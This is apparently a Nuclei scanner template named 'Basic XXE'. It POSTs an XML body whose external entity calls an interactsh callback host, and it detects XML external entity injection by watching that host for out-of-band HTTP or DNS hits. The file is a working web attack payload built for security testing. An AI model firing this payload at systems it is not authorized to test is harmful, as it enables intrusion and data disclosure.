http:
- matchers:
  - part: interactsh_protocol
    type: word
    words:
    - http
    - dns
  raw:
  - 'POST / HTTP/1.1

    Host: {{Hostname}}

    User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:109.0) Gecko/20100101
    Firefox/116.0

    Content-Type: application/xml;charset=UTF-8


    <?xml version="1.0" ?><!DOCTYPE root [<!ENTITY % ext SYSTEM "http://{{interactsh-url}}/x">
    %ext;]><r></r>

    '
  stop-at-first-match: true
id: basic-xxe-post
info:
  author: reewardius
  name: Basic XXE
  severity: high
  tags: xxe
